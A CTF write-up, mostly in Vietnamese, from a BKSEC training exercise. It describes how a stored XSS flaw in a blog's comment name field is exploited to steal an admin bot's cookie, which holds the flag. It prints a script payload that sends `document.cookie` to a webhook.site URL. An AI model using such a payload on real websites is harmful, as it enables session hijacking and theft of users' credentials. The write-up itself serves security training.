---
title: "Report the violations"
date: 2026-05-13
platform: "BKSEC_training"
category: "Web"
difficulty: "Hidden"
tags: ["web", "bksec-training"]
series: "BKSEC Training 2026"
draft: false
---

## Report the violations

## Challenge Information
- **Category**: Web Exploitation
- **Event**: BKSEC training 2026
- **Author**: f1rst
- **Difficulty**: Hidden
- **Tags**: #web #XSStored  
---
## 1. Description
> I am currently in the process of blogging. However, there are some members who have posted negative comments on my article. Could you please assist me in reporting these comments to the admin for prompt resolution?
   (The system will be reset to the default each 15 minutes)
## 2. Overview
Bài này giao diện là một trang blog có chức năng comment và report comment, dính lỗ hổng XSS stored. Khi report comment bot với quyền admin sẽ quét và thực hiện script đã được inject, lúc này ta sẽ đánh cắp được cookie của bot và lấy được flag.
## 3. Reconnaissance
- Trang web có giao diện là một blog với các chức năng như post comment, report comment

![](./images/Pasted%20image%2020260210153440.png)

![](./images/Pasted%20image%2020260210155939.png)

-> Nghi vấn khả năng rất cao là XSS Stored, thử một vài payload để xem dự đoán đúng không.

- Thử điền `<h1> test </h1>` và `test`

![](./images/Pasted%20image%2020260210160426.png)

- Chữ `test` hiện to hơn bình thường
-> 99% dính XSS Stored, mở Burp bắt request để tìm hướng viết payload lấy flag

![](./images/Pasted%20image%2020260210185211.png)

-> xem chi tiết `/post-comment`

![](./images/Pasted%20image%2020260210162155.png)

- Nhìn vào phần Cookie ta thấy trường `Flag` là "ADMIN ONLY!!!!!!!!!!!!!!!!"
-> Đánh cắp Cookie của tài khoản Admin sẽ lấy được flag
- Dựa vào chức năng `report` của trang web ta có thể đoán khi click vào `report` sẽ có một người có quyền admin vào để xem xét comment đó có vi phạm hay không rồi mới duyệt để xóa, vì vậy ta có thể cài sẵn một đoạn mã độc để khi trình duyệt admin vào sẽ kích hoạt đoạn mã đánh cắp Cookie, từ đó ta có thể lấy được flag.
## 4. Exploitation
- Để lấy được Cookie đầu tiên ta phải có một nơi để gửi thông tin đến, sử dụng một **Webhook** làm trạm thu phát trung gian để nhận dữ liệu từ trình duyệt Admin gửi về. Trong bài này sẽ dùng webhook với url `https://webhook.site/7ae5a951-65c1-4b5f-bb45-1bbc472d65fd`
- Inject vào phần `your name` của comment trang blog script để lấy cắp cookie và gửi về webhook trên:
```javascript
<script>fetch('https://webhook.site/7ae5a951-65c1-4b5f-bb45-1bbc472d65fd?cookie='+document.cookie)</script>
```

![](./images/Pasted%20image%2020260210170324.png)

- Phần tên biến mất chỉ còn phần message -> script đã được inject thành công.
- Bây giờ ta sẽ report để gửi đến admin và đợi kết quả gửi về webhook.
- Kiểm tra webhook phần `Query String` và nhận flag.

![](./images/Pasted%20image%2020260210170638.png)